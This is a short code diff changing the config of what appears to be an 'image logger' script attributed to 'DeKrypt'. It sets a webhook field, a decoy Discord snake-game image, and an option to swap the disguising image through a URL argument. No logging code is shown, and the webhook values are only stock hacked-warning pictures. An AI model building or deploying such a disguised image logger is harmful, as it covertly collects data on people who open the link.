@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg",
+    "webhook": "https://s39569.pcdn.co/wp-content/uploads/2023/06/computer-popup-box-screen-warning-of-a-system-being-hacked.jpeg",
     "image": "https://images.saymedia-content.com/.image/t_share/MTk2MTIxNzg5MDMyNTcyMDQ5/discord-snake-game.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
